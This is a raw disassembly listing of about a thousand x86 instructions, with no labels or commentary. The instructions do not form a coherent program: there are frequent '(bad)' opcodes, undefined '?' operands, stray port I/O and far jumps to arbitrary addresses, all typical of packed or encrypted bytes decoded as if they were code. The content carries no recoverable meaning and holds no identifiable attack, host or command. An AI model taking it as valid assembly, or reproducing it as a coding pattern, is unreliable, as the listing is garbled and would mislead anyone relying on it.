  420df9:	pop    eax
  420dfa:	jmp    0x420e5a
  420dfc:	retf   
  420dfd:	jl     0x420e54
  420dff:	aaa    
  420e00:	jle    0x420dd4
  420e02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e03:	xchg   BYTE PTR [ebx+0x7],bh
  420e06:	jmp    0x9df71c7b
  420e0b:	lods   al,BYTE PTR ds:[esi]
  420e0c:	mov    edi,DWORD PTR [ecx+0x5739ade7]
  420e12:	inc    edx
  420e13:	fstp   TBYTE PTR [ecx-0x1911236c]
  420e19:	xchg   BYTE PTR [edi-0x6eceedfe],bh
  420e1f:	(bad)  
  420e20:	fistp  QWORD PTR [eax-0x32]
  420e23:	aaa    
  420e24:	add    ebx,DWORD PTR [edx-0x80]
  420e27:	imul   edx,DWORD PTR [ebp-0x7c],0xef34a7d
  420e2e:	aas    
  420e2f:	add    al,0xd5
  420e31:	sbb    BYTE PTR [eax+ebp*8],bh
  420e34:	mov    ds:0x93e1666d,al
  420e39:	xchg   BYTE PTR [ebx-0x3a],dl
  420e3c:	retf   
  420e3d:	popf   
  420e3e:	lods   eax,DWORD PTR ds:[esi]
  420e3f:	fnstenv [ebx+0x17]
  420e42:	fs xchg esi,eax
  420e44:	sub    BYTE PTR [eax],ch
  420e46:	xchg   esp,eax
  420e47:	pop    eax
  420e48:	and    ebx,DWORD PTR [edx-0x7a8b5e7f]
  420e4e:	in     al,dx
  420e4f:	xor    eax,edx
  420e51:	pop    ecx
  420e52:	in     al,0xd4
  420e54:	pop    es
  420e55:	push   edx
  420e56:	mov    dl,0x5c
  420e58:	mov    ds:0x3aa241e3,al
  420e5d:	xchg   ecx,eax
  420e5e:	popa   
  420e5f:	push   eax
  420e60:	adc    edx,edi
  420e62:	add    al,0x1a
  420e64:	add    al,0xab
  420e66:	jmp    0x420e90
  420e68:	push   0xffffffdc
  420e6a:	push   es
  420e6b:	loope  0x420e34
  420e6d:	inc    dl
  420e6f:	xchg   edi,eax
  420e70:	mov    eax,0xa0da5799
  420e75:	imul   edx,esi,0x6f7bab9
  420e7b:	pop    esi
  420e7c:	sub    DWORD PTR [ebp-0x320ce1d7],edi
  420e82:	sub    esp,edx
  420e84:	out    0xa9,al
  420e86:	or     bh,bl
  420e88:	fwait
  420e89:	inc    eax
  420e8a:	jno    0x420e4d
  420e8c:	mov    cl,0xd2
  420e8e:	ss xchg ebp,eax
  420e90:	or     dh,dl
  420e92:	jl     0x420e8e
  420e94:	ror    DWORD PTR [esi+0x74f993ca],cl
  420e9a:	daa    
  420e9b:	add    edi,DWORD PTR [ebp+0x65]
  420e9e:	rcl    BYTE PTR ds:0xe6c8d0da,0xa8
  420ea5:	ins    DWORD PTR es:[edi],dx
  420ea6:	retf   0x7314
  420ea9:	mov    ch,0x56
  420eab:	(bad)  
  420eac:	jge    0x420ec5
  420eae:	inc    ebx
  420eaf:	dec    edi
  420eb0:	pop    ebx
  420eb1:	neg    BYTE PTR [edx]
  420eb3:	bound  edi,QWORD PTR ds:0xb9bdd11f
  420eb9:	mov    edx,0x76861927
  420ebe:	or     DWORD PTR [ecx],ebx
  420ec0:	xlat   BYTE PTR es:[ebx]
  420ec2:	mov    ebx,0x64556aff
  420ec7:	stc    
  420ec8:	leave  
  420ec9:	cwde   
  420eca:	push   es
  420ecb:	test   DWORD PTR ds:0x7c58c6db,ebx
  420ed1:	push   ss
  420ed2:	mov    esp,0x8497136f
  420ed7:	stos   BYTE PTR es:[edi],al
  420ed8:	sti    
  420ed9:	push   edx
  420eda:	pop    ds
  420edb:	fs les edx,FWORD PTR ds:[edx]
  420edf:	add    al,0x41
  420ee1:	mov    ds:0x1add69ab,al
  420ee6:	jp     0x420f51
  420ee8:	mov    esi,0xd7e55d86
  420eed:	in     eax,dx
  420eee:	sbb    bh,bh
  420ef0:	xchg   esi,eax
  420ef1:	pop    ebp
  420ef2:	mov    ebx,esi
  420ef4:	push   ebp
  420ef5:	pop    ds
  420ef6:	sar    BYTE PTR [eax-0x2a],0x2
  420efa:	push   ebp
  420efb:	sub    eax,0xdb014a61
  420f00:	push   ds
  420f01:	shl    BYTE PTR [edx-0x1b],cl
  420f04:	push   ds
  420f05:	xchg   esi,eax
  420f06:	pop    es
  420f07:	inc    esi
  420f08:	mov    BYTE PTR [esi],bh
  420f0a:	aam    0x5a
  420f0c:	pop    eax
  420f0d:	push   0xc8a10850
  420f12:	sub    ch,BYTE PTR [edx+0x12]
  420f15:	push   ss
  420f16:	sub    eax,0x4a12f927
  420f1b:	scas   eax,DWORD PTR es:[edi]
  420f1c:	mov    edx,0x7e51d654
  420f21:	loopne 0x420eaf
  420f23:	xchg   ebx,eax
  420f24:	shr    DWORD PTR [esi],cl
  420f26:	pop    edx
  420f27:	xor    DWORD PTR [esi+0x5b721caf],ecx
  420f2d:	fistp  WORD PTR [edx+eiz*4]
  420f30:	fidivr WORD PTR [ebx-0x20]
  420f33:	mov    ?,WORD PTR ds:0xc6e64f3d
  420f39:	call   0xac9a:0x11f4d7b
  420f40:	aam    0xd7
  420f42:	nop
  420f43:	ror    esi,1
  420f45:	sbb    dl,BYTE PTR [ebx-0x4ebd2eba]
  420f4b:	xchg   BYTE PTR [ebx-0x15],ah
  420f4e:	dec    ecx
  420f4f:	scas   eax,DWORD PTR es:[edi]
  420f50:	aad    0xc
  420f52:	and    eax,0xd08308e7
  420f57:	neg    dl
  420f59:	scas   al,BYTE PTR es:[edi]
  420f5a:	mov    cl,0x44
  420f5c:	lods   al,BYTE PTR ds:[esi]
  420f5d:	ss jl  0x420ee5
  420f60:	inc    ecx
  420f61:	xchg   edx,eax
  420f62:	push   0x52
  420f64:	fstp   DWORD PTR [ebp+0x62]
  420f67:	cmp    eax,0x7dddd255
  420f6c:	cmp    BYTE PTR [ebp+0x7d],ch
  420f6f:	mov    esp,0xbff14c3d
  420f74:	aas    
  420f75:	arpl   WORD PTR [ecx-0x70],ax
  420f78:	repz repz jl 0x420fa5
  420f7c:	(bad)  
  420f7d:	jle    0x420fea
  420f7f:	mov    dh,0x84
  420f81:	loopne 0x420fa7
  420f83:	fisub  WORD PTR [ebx+0x3d8d9200]
  420f89:	xor    esi,eax
  420f8b:	retf   
  420f8c:	xchg   al,dl
  420f8e:	stos   DWORD PTR es:[edi],eax
  420f8f:	mov    bh,BYTE PTR [edi+ebp*8]
  420f92:	fld    TBYTE PTR [eax+0x27]
  420f95:	sub    ah,cl
  420f97:	fucomi st,st(4)
  420f99:	adc    al,0x65
  420f9b:	shr    al,cl
  420f9d:	cmc    
  420f9e:	mov    dh,0xba
  420fa0:	dec    BYTE PTR [ecx-0x677c4e2c]
  420fa6:	int3   
  420fa7:	dec    edi
  420fa8:	pop    ds
  420fa9:	xchg   esp,eax
  420faa:	or     eax,0xf67b9110
  420faf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fb0:	adc    bl,ah
  420fb2:	fucomp st(3)
  420fb4:	outs   dx,DWORD PTR ds:[esi]
  420fb5:	adc    eax,0x4281b64b
  420fba:	ins    BYTE PTR es:[edi],dx
  420fbb:	push   es
  420fbc:	loop   0x420fdb
  420fbe:	enter  0xb1a6,0x95
  420fc2:	add    eax,DWORD PTR [eax+edi*1-0x21d8f2d0]
  420fc9:	out    0x6e,eax
  420fcb:	arpl   bx,cx
  420fcd:	and    bl,BYTE PTR [edx-0x30]
  420fd0:	(bad)
  420fd4:	push   0xb59c64e8
  420fd9:	push   edx
  420fda:	add    esp,edx
  420fdc:	and    dh,BYTE PTR [ebx]
  420fde:	pop    edi
  420fdf:	inc    ebp
  420fe0:	mov    eax,ds:0xa9ca7306
  420fe5:	inc    edi
  420fe6:	aad    0x25
  420fe8:	or     DWORD PTR [ebp+0x3e49703],0xfc9e49c1
  420ff2:	retf   
  420ff3:	(bad)  
  420ff4:	xor    BYTE PTR [esi+0x67bf5784],dl
  420ffa:	or     BYTE PTR [edx-0x5a8fda50],ch
  421000:	cwde   
  421001:	add    ebx,ebx
  421003:	cmp    ecx,DWORD PTR [ebx]
  421005:	pop    eax
  421006:	(bad)  
  421007:	not    BYTE PTR [edi]
  421009:	bound  eax,QWORD PTR [edi-0x3]
  42100c:	cmp    bl,BYTE PTR [edi]
  42100e:	fimul  WORD PTR [ebx+0x5]
  421011:	inc    ecx
  421012:	ins    BYTE PTR es:[edi],dx
  421013:	out    dx,al
  421014:	sub    eax,0xea334f42
  421019:	mov    eax,ds:0x88d1d7eb
  42101e:	pop    ebx
  42101f:	fldcw  WORD PTR [edi+0x3f]
  421022:	loopne 0x42106f
  421024:	pop    ebp
  421025:	cmp    ah,BYTE PTR [ebp+ebp*2+0xc918e5d]
  42102c:	(bad)
  42102f:	fld    TBYTE PTR [ebp-0x7c]
  421032:	mov    ebp,0xe5d085d3
  421037:	sar    BYTE PTR [ebx-0x5f14c747],1
  42103d:	sbb    DWORD PTR [ebx+0x4d],ebx
  421040:	or     ah,BYTE PTR ds:0xb5029c67
  421046:	inc    esi
  421047:	mov    ds:0x90f0fc8e,eax
  42104c:	xor    DWORD PTR [esi+0x6f717610],esp
  421052:	jnp    0x421082
  421054:	inc    ecx
  421055:	mov    bl,0x3e
  421057:	xor    al,0x5f
  421059:	fwait
  42105a:	jge    0x4210ac
  42105c:	hlt    
  42105d:	cmp    ch,bl
  42105f:	cld    
  421060:	push   0x1b
  421062:	push   0x5a821667
  421067:	addr16 inc ebp
  421069:	ins    BYTE PTR es:[edi],dx
  42106a:	ret    0x1329
  42106d:	sbb    ecx,DWORD PTR [eax-0x4e]
  421070:	mov    dh,0xb5
  421072:	fmul   QWORD PTR [edx+0x57]
  421075:	rcr    edx,1
  421077:	ins    DWORD PTR es:[edi],dx
  421078:	mov    BYTE PTR [ecx-0x24],dh
  42107b:	jle    0x42109c
  42107d:	sbb    eax,0x4cc3b0c4
  421082:	test   al,0xf3
  421084:	and    DWORD PTR [edi-0x2c],esp
  421087:	(bad)  
  421088:	jmp    0x4e86:0xc79732f8
  42108f:	lods   eax,DWORD PTR ds:[esi]
  421090:	ins    BYTE PTR es:[edi],dx
  421091:	repz mov cl,0xfc
  421094:	or     al,0xb0
  421096:	imul   esi,edi,0x49
  421099:	or     eax,0xb88b7594
  42109e:	ja     0x421076
  4210a0:	mov    al,ds:0xabc5e0dd
  4210a5:	out    0xd9,eax
  4210a7:	or     ebx,edi
  4210a9:	iret   
  4210aa:	or     DWORD PTR [esi-0x13],0x4624b555
  4210b1:	push   esi
  4210b2:	popa   
  4210b3:	or     eax,0xcb2cfec
  4210b8:	inc    ecx
  4210b9:	xchg   esp,eax
  4210ba:	pushf  
  4210bb:	jmp    0x4210a8
  4210bd:	rol    BYTE PTR [esi-0x2d820d97],1
  4210c3:	ds and ebx,ebp
  4210c6:	xlat   BYTE PTR ds:[ebx]
  4210c7:	mov    BYTE PTR [ecx+ebx*4],al
  4210ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210cb:	adc    eax,0x6581e7f0
  4210d0:	fdivr  DWORD PTR [ecx+0x56]
  4210d3:	scas   eax,DWORD PTR es:[edi]
  4210d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210d5:	fwait
  4210d6:	into   
  4210d7:	push   esp
  4210d8:	ds jge 0x4210db
  4210db:	sbb    eax,0xbffd61a7
  4210e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210e1:	mov    eax,esp
  4210e3:	jb     0x4210a4
  4210e5:	add    esi,DWORD PTR [eax]
  4210e7:	xchg   ebx,eax
  4210e8:	mov    edx,0xf5e18ac0
  4210ed:	add    edi,DWORD PTR [ebp+0x3b]
  4210f0:	sub    edi,edi
  4210f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210f3:	mov    dl,0x6c
  4210f5:	gs inc esp
  4210f7:	push   edi
  4210f8:	loope  0x4210f5
  4210fa:	lods   eax,DWORD PTR ds:[esi]
  4210fb:	xchg   ebp,esp
  4210fd:	lahf   
  4210fe:	xor    al,0x3d
  421101:	das    
  421102:	test   BYTE PTR [ebp+0x5be6a664],bh
  421108:	ins    DWORD PTR es:[edi],dx
  421109:	jle    0xf3cc7d84
  42110f:	iret   
  421110:	lods   eax,DWORD PTR ds:[esi]
  421111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421112:	(bad)  
  421113:	mov    fs,WORD PTR [esi+ecx*4-0x1e]
  421117:	sar    BYTE PTR [eax-0x38f6fd45],1
  42111d:	aam    0x9c
  42111f:	nop    DWORD PTR [eax+0x7c96d88c]
  421126:	push   cs
  421127:	lea    edx,[edx]
  421129:	loopne 0x42119d
  42112b:	sbb    dh,BYTE PTR [eax+edx*8-0x64]
  42112f:	jle    0x421164
  421131:	fidivr DWORD PTR [eax+0x4008049a]
  421137:	stos   BYTE PTR es:[edi],al
  421138:	jns    0x4210fa
  42113a:	nop
  42113b:	fcom   QWORD PTR [ebx-0x2e]
  42113e:	push   es
  42113f:	adc    cl,BYTE PTR [edi]
  421141:	pop    es
  421142:	mov    ebp,0x88e47e41
  421147:	ins    BYTE PTR es:[edi],dx
  421148:	pop    es
  421149:	(bad)  
  42114a:	fstp   st(1)
  42114c:	sub    eax,0x50effe2
  421151:	call   0x222:0x85448620
  421158:	cmp    BYTE PTR [eax+0x4a06a15a],ah
  42115e:	nop
  42115f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421160:	add    al,0x7
  421162:	xchg   ebx,eax
  421163:	hlt    
  421164:	cmp    al,0xbb
  421166:	inc    eax
  421167:	fcom   DWORD PTR [ecx+esi*1+0x19cd3979]
  42116e:	ins    BYTE PTR es:[edi],dx
  42116f:	cmp    dh,al
  421171:	int    0x56
  421173:	pop    es
  421174:	sbb    dh,cl
  421176:	ret    
  421177:	fxch   st(3)
  421179:	ins    DWORD PTR es:[edi],dx
  42117a:	test   eax,0x90e50c09
  42117f:	mov    ebx,0xa5fa99b4
  421184:	sub    BYTE PTR [edx],cl
  421186:	xchg   edx,eax
  421187:	sub    eax,0x8713c538
  42118c:	xor    BYTE PTR [esi],al
  42118e:	enter  0x71e7,0xe6
  421192:	jae    0x4211fd
  421194:	add    ecx,DWORD PTR [si-0xa]
  421198:	xor    DWORD PTR [bp-0x1549],0x9701f9be
  4211a1:	pop    eax
  4211a2:	pop    edx
  4211a3:	aad    0x68
  4211a5:	out    0xe0,eax
  4211a7:	jmp    0xd0e86758
  4211ac:	push   0x2470f086
  4211b1:	push   0x78
  4211b3:	out    dx,eax
  4211b4:	test   eax,0x18704060
  4211b9:	add    al,0xb9
  4211bb:	cli    
  4211bc:	or     ecx,DWORD PTR [eax+0x2dbdbe4e]
  4211c2:	pop    ebp
  4211c3:	jo     0x4211f2
  4211c5:	push   ecx
  4211c6:	jno    0x421221
  4211c8:	arpl   WORD PTR [ecx],cx
  4211ca:	es test al,0x4a
  4211cd:	sub    DWORD PTR [ecx-0x4b],esi
  4211d0:	scas   eax,DWORD PTR es:[edi]
  4211d1:	clc    
  4211d2:	add    ecx,DWORD PTR [ebx-0x325226bc]
  4211d8:	pop    esi
  4211d9:	lods   eax,DWORD PTR ds:[esi]
  4211da:	mov    ds:0xb023dafe,al
  4211df:	cmc    
  4211e0:	test   dl,0x33
  4211e3:	or     DWORD PTR [ebx-0x5947b0c0],esp
  4211e9:	(bad)  
  4211ea:	repz jecxz 0x421214
  4211ed:	fucompp 
  4211f0:	data16 das 
  4211f2:	cmp    al,0x51
  4211f4:	add    al,0x55
  4211f6:	push   ebx
  4211f7:	mov    dl,0x79
  4211f9:	in     eax,0x3b
  4211fb:	hlt    
  4211fc:	stos   BYTE PTR es:[edi],al
  4211fd:	dec    ebx
  4211fe:	(bad)  
  4211ff:	jmp    0xc8ae982c
  421204:	sub    eax,0xe89916f0
  421209:	ins    BYTE PTR es:[edi],dx
  42120a:	adc    ebp,esp
  42120c:	shl    esp,0xcb
  42120f:	inc    esi
  421210:	imul   DWORD PTR [ebp-0x39]
  421213:	mov    al,ds:0xba92ee67
  421218:	loope  0x4211d8
  42121a:	in     al,0x7d
  42121c:	je     0x42122e
  42121e:	or     al,BYTE PTR [edx-0x78d9f0cc]
  421224:	jl     0x42120f
  421226:	pop    edx
  421227:	je     0x421207
  421229:	fidiv  WORD PTR [eax+0x4d]
  42122c:	stc    
  42122d:	cmp    al,0x95
  42122f:	out    0x8a,eax
  421231:	add    eax,0x1669ae1a
  421236:	sub    al,0xda
  421238:	repz mov gs,WORD PTR ds:0xa01d7d31
  42123f:	test   ecx,0x76b5f00e
  421245:	pop    ecx
  421246:	xchg   ebx,eax
  421247:	pop    esi
  421248:	mov    eax,0xe5e7b4d5
  42124d:	dec    eax
  42124e:	les    ecx,FWORD PTR [ebp-0x3d9c8407]
  421254:	fisttp DWORD PTR [esi]
  421256:	mov    al,ds:0x4d295f
  42125b:	cs inc edx
  42125d:	and    ah,BYTE PTR [edx]
  42125f:	lods   al,BYTE PTR ds:[esi]
  421260:	push   ds
  421261:	jp     0x4211e5
  421263:	rol    BYTE PTR [esi],1
  421265:	sbb    BYTE PTR [eax],al
  421267:	test   BYTE PTR [ecx-0x5f],al
  42126a:	rcr    BYTE PTR [edi],1
  42126c:	push   es
  42126d:	jnp    0x4212aa
  42126f:	(bad)  
  421270:	fidiv  DWORD PTR [ebp+0x69]
  421273:	(bad)  
  421274:	cwde   
  421275:	and    ecx,0xc431a642
  42127b:	test   BYTE PTR [edx-0x19],cl
  42127e:	stc    
  42127f:	push   esp
  421281:	ins    DWORD PTR es:[edi],dx
  421282:	retf   0xf545
  421285:	dec    eax
  421286:	cmp    al,0x38
  421288:	pop    es
  421289:	cmc    
  42128a:	ins    BYTE PTR es:[edi],dx
  42128b:	bound  edx,QWORD PTR [edx]
  42128d:	aad    0xc7
  42128f:	fist   DWORD PTR [eax+0x1001f087]
  421295:	push   ebp
  421296:	push   ds
  421297:	xchg   esi,ebx
  421299:	xchg   BYTE PTR [edx+esi*8],ah
  42129c:	jle    0x421299
  42129e:	adc    DWORD PTR [edi-0x17],edx
  4212a1:	int    0x59
  4212a3:	or     ebx,DWORD PTR [eax]
  4212a5:	push   ss
  4212a6:	mov    edx,0xd4752a7d
  4212ab:	adc    eax,0xdcff643c
  4212b0:	rcr    DWORD PTR [eax],0x7e
  4212b3:	adc    eax,esi
  4212b5:	and    eax,0x24d52f0e
  4212ba:	mov    esp,0xd1da85a0
  4212bf:	mov    esp,0x527eb60a
  4212c4:	fcomp  QWORD PTR [ecx]
  4212c6:	mov    ecx,0x299ea7d7
  4212cb:	fs enter 0xaf90,0xbe
  4212d0:	add    ah,BYTE PTR [ebx+0x44b1795b]
  4212d6:	sub    al,0xc
  4212d8:	pop    esp
  4212d9:	loope  0x421333
  4212db:	repnz adc eax,0xf2cc873f
  4212e1:	sbb    ebp,DWORD PTR [ebx+0x64]
  4212e4:	dec    edi
  4212e5:	ret    0xfca3
  4212e8:	in     eax,0x6
  4212ea:	ins    DWORD PTR es:[edi],dx
  4212eb:	stc    
  4212ec:	mov    eax,0x91f2ce1a
  4212f1:	xchg   DWORD PTR ds:0x17ea332e,edx
  4212f7:	inc    ecx
  4212f8:	add    DWORD PTR [edi-0x2c],edi
  4212fb:	add    bl,BYTE PTR [esi-0x1c758047]
  421301:	push   cs
  421302:	xor    eax,0x9201c7bf
  421307:	inc    esp
  421308:	ja     0x42134e
  42130a:	sub    al,0x2e
  42130c:	jne    0x421386
  42130e:	in     eax,0x8e
  421310:	cmp    BYTE PTR [ecx+0x1f5e7037],0x6d
  421317:	sub    al,0xad
  421319:	or     eax,0x941cb17e
  42131e:	add    ah,BYTE PTR ds:0x608e68cf
  421324:	addr16 das 
  421326:	loope  0x421394
  421328:	outs   dx,BYTE PTR ds:[esi]
  421329:	mov    ebx,0x5dc53bc8
  42132e:	daa    
  42132f:	icebp  
  421330:	imul   edi,DWORD PTR [edx+edx*2+0x573ab1b3],0xffffff85
  421338:	jmp    0xd6ff:0x3210fe07
  42133f:	ficom  DWORD PTR [ecx-0x4c5df19c]
  421345:	das    
  421346:	lods   al,BYTE PTR ds:[esi]
  421347:	cs jnp 0x421358
  42134a:	push   es
  42134b:	fst    st(1)
  42134d:	jecxz  0x4213a1
  42134f:	jmp    0xc18f:0xbdf0d63e
  421356:	pop    ss
  421357:	scas   eax,DWORD PTR es:[edi]
  421358:	sub    BYTE PTR ds:0xeb04781c,ch
  42135e:	or     BYTE PTR [esi],0xad
  421361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421362:	jo     0x4213d2
  421364:	pop    eax
  421365:	sub    BYTE PTR [edi+0x7],bh
  421368:	repnz pushf 
  42136a:	mov    ch,0xff
  42136c:	fadd   DWORD PTR [ecx-0x36faa937]
  421372:	aam    0xd5
  421374:	xor    eax,0x8f6d340
  421379:	imul   esi,DWORD PTR [edx-0x24fc1108],0x76
  421380:	push   0xffffffb8
  421382:	(bad)  
  421383:	rol    ebx,cl
  421385:	push   esi
  421386:	push   ss
  421387:	repz sti 
  421389:	scas   al,BYTE PTR es:[edi]
  42138a:	dec    BYTE PTR [ecx-0x60ac24fe]
  421390:	lds    esp,FWORD PTR es:[ecx+esi*1-0x1be69c57]
  421398:	mov    ecx,0x4d858125
  42139d:	dec    edx
  42139e:	ud0    ecx,DWORD PTR ss:[edx+0x264c5da6]
  4213a6:	jnp    0x42138b
  4213a8:	das    
  4213a9:	or     al,0x2f
  4213ab:	mov    esp,0x36c7519b
  4213b0:	fdiv   QWORD PTR [ebx-0x25]
  4213b3:	fisub  WORD PTR [edx]
  4213b5:	stos   WORD PTR es:[edi],ax
  4213b7:	out    0xc0,al
  4213b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213ba:	in     eax,0xa2
  4213bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213bd:	xor    bh,BYTE PTR [eax+0x34fa6340]
  4213c3:	jle    0x4213fc
  4213c5:	dec    ebp
  4213c6:	or     al,0xb2
  4213c8:	ja     0x42141f
  4213ca:	fistp  QWORD PTR [ecx]
  4213cc:	xlat   BYTE PTR ds:[ebx]
  4213cd:	mov    cl,0x3c
  4213cf:	sub    al,BYTE PTR [edx-0x71]
  4213d2:	push   esi
  4213d3:	push   ebp
  4213d4:	enter  0x784e,0x11
  4213d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213d9:	sub    BYTE PTR [ecx-0x57],bl
  4213dc:	push   ds
  4213dd:	add    BYTE PTR [edx-0x30],cl
  4213e0:	sbb    al,0xa
  4213e2:	add    al,0xb8
  4213e4:	dec    ebp
  4213e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213e6:	jmp    0xbaa7bd45
  4213eb:	ror    al,0x2a
  4213ee:	dec    ecx
  4213ef:	mov    BYTE PTR [edi-0x2c827754],cl
  4213f5:	pop    es
  4213f6:	out    dx,eax
  4213f7:	or     al,0x1
  4213f9:	mov    esp,0xa44ee9ec
  4213fe:	out    0xb7,eax
  421400:	mov    es,WORD PTR [ecx-0x79a3c8b2]
  421406:	les    ebp,FWORD PTR [eax]
  421408:	scas   al,BYTE PTR es:[edi]
  421409:	mov    edi,ebx
  42140b:	sbb    bl,BYTE PTR ds:0x931a91bd
  421411:	sbb    dl,dl
  421413:	retf   
  421414:	inc    eax
  421415:	cwde   
  421416:	push   ebx
  421417:	jb     0x42147f
  421419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42141a:	jbe    0x421495
  42141c:	mov    ebp,0x141d9bfe
  421421:	xchg   edx,eax
  421422:	rcr    DWORD PTR [ebp+0x5e],0x24
  421426:	push   edx
  421427:	ror    DWORD PTR [ecx+0x71ef930b],cl
  42142d:	pop    eax
  42142e:	push   ds
  42142f:	inc    esi
  421430:	ja     0x4213f4
  421432:	pop    esi
  421433:	arpl   si,cx
  421435:	loope  0x421424
  421437:	mov    dl,0xfc
  421439:	push   esi
  42143a:	add    bh,cl
  42143c:	mov    cl,0xb7
  42143e:	retf   
  42143f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  421441:	mov    eax,ds:0xb3ab6828
  421446:	hlt    
  421447:	fucomi st,st(3)
  421449:	mov    dh,cl
  42144b:	scas   al,BYTE PTR es:[edi]
  42144c:	xor    DWORD PTR [edx],ebx
  42144e:	mov    ebx,eax
  421450:	scas   al,BYTE PTR es:[edi]
  421451:	pop    eax
  421452:	rcr    BYTE PTR [edi],cl
  421454:	mov    edx,0x92fdf795
  421459:	sub    ch,BYTE PTR [ebp+0x27]
  42145c:	inc    edx
  42145d:	push   ecx
  42145e:	jmp    0x4214c2
  421460:	push   ss
  421461:	push   edi
  421462:	fwait
  421463:	push   esi
  421464:	jo     0x4214b0
  421466:	xchg   esi,eax
  421467:	mov    WORD PTR [ebx],?
  421469:	dec    edi
  42146a:	sub    eax,0xa7b4e9ed
  42146f:	xor    al,ch
  421471:	into   
  421472:	mov    ebp,DWORD PTR [ecx]
  421474:	add    eax,0xbea7bb1f
  421479:	add    eax,0x12714a73
  42147e:	cmc    
  42147f:	outs   dx,DWORD PTR es:[esi]
  421481:	inc    ecx
  421482:	push   cs
  421483:	fiadd  DWORD PTR [eax]
  421485:	xlat   BYTE PTR ds:[ebx]
  421486:	sar    DWORD PTR [edx-0x7748778d],cl
  42148c:	inc    ebp
  42148d:	aad    0x82
  42148f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421490:	test   ebx,esi
  421492:	push   edi
  421493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421494:	add    edx,DWORD PTR [edi]
  421496:	push   ebx
  421497:	sub    al,0xae
  421499:	mov    al,0xa9
  42149b:	fcmove st,st(0)
  42149d:	mov    dh,0x21
  42149f:	aad    0xa
  4214a1:	aam    0x32
  4214a3:	pop    ss
  4214a4:	jb     0x42144a
  4214a6:	mov    ds:0x6853c1f2,al
  4214ab:	xchg   BYTE PTR [edi-0x7fe6416b],bl
  4214b1:	arpl   WORD PTR [edi+edi*8],di
  4214b4:	and    cl,bl
  4214b6:	pop    ebp
  4214b7:	pusha  
  4214b8:	arpl   WORD PTR [ebp+0x3fafb10c],cx
  4214be:	mov    ah,0x44
  4214c0:	push   ebx
  4214c1:	xchg   ebx,eax
  4214c2:	fwait
  4214c3:	ss and al,0x10
  4214c6:	icebp  
  4214c7:	jl     0x42146e
  4214c9:	jb     0x421508
  4214cb:	mov    ds,WORD PTR [eax+0x59]
  4214ce:	add    ebp,edx
  4214d0:	xor    al,0x21
  4214d2:	cdq    
  4214d3:	pop    ecx
  4214d4:	xchg   ebp,eax
  4214d5:	mov    dh,0x91
  4214d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214d8:	push   ecx
  4214d9:	xor    BYTE PTR [edx+eax*4-0x2d],ch
  4214dd:	sbb    bh,bl
  4214df:	lods   eax,DWORD PTR ds:[esi]
  4214e0:	mov    ecx,esi
  4214e2:	lahf   
  4214e3:	arpl   WORD PTR [ebp-0x5],cx
  4214e6:	test   al,0x2c
  4214e8:	adc    bl,BYTE PTR ds:0x8fd4ab5f
  4214ee:	sar    BYTE PTR [ebx+ebx*8-0x51e329e4],0xd5
  4214f6:	sar    bh,cl
  4214f8:	adc    ah,bh
  4214fa:	pop    ebp
  4214fb:	les    esi,FWORD PTR [ebx+0x45]
  4214fe:	popf   
  4214ff:	shl    BYTE PTR [esi],1
  421501:	loopne 0x4214ae
  421503:	add    DWORD PTR [edi-0x416f3d6e],edi
  421509:	les    esi,FWORD PTR [ebp-0x4c]
  42150c:	je     0x421574
  42150e:	repz mov dh,0x92
  421511:	jge    0x421533
  421513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421514:	scas   al,BYTE PTR es:[edi]
  421515:	ins    DWORD PTR es:[edi],dx
  421516:	jg     0x421586
  421518:	bound  edx,QWORD PTR [edx-0x72a08c50]
  42151e:	rcr    ebx,0xe4
  421521:	cmp    eax,0xff04bed5
  421526:	or     eax,0xca918dbd
  42152b:	sub    eax,0x234e9a1d
  421530:	mov    esp,0x6195b8f
  421535:	sub    BYTE PTR [esi+0x49afc0f9],bh
  42153b:	mov    eax,0xf9a06072
  421540:	inc    ebp
  421541:	or     cl,BYTE PTR [esp+esi*1]
  421544:	in     al,0x75
  421546:	arpl   WORD PTR [edi+0x3b4309f2],di
  42154c:	dec    ecx
  42154d:	ror    BYTE PTR [ebp-0x12],1
  421550:	ja     0x421525
  421552:	sub    DWORD PTR [ebx-0x3a3b04e9],esp
  421558:	jp     0x4214e3
  42155a:	or     BYTE PTR [ecx],cl
  42155c:	je     0x42159d
  42155e:	shr    DWORD PTR [esp+eax*1-0x73],0x99
  421563:	adc    DWORD PTR fs:[ebx+0x408801ca],ecx
  42156a:	in     al,0xf7
  42156c:	add    DWORD PTR [edx+0x6dc0cea4],edx
  421572:	mov    esp,0x8ca5b1a7
  421577:	mov    esi,0x57d73c55
  42157c:	lea    eax,[ebx]
  42157e:	pop    es
  42157f:	aad    0xd3
  421581:	in     eax,dx
  421582:	rcl    esp,cl
  421584:	add    DWORD PTR [ecx+0x6683d0d],esp
  42158a:	aaa    
  42158b:	mov    es,WORD PTR [ebx]
  42158d:	pop    ds
  42158e:	(bad)  
  42158f:	cmp    DWORD PTR [ebp+0x7820414],ebp
  421595:	inc    ecx
  421596:	sub    DWORD PTR [eax+eiz*1],edi
  421599:	in     al,dx
  42159a:	scas   eax,DWORD PTR es:[edi]
  42159b:	(bad)
  42159e:	xchg   ebp,eax
  42159f:	add    eax,0x3882f8a8
  4215a4:	loop   0x42160a
  4215a6:	sahf   
  4215a7:	xchg   edi,eax
  4215a8:	(bad)  
  4215a9:	clc    
  4215aa:	outs   dx,BYTE PTR ds:[esi]
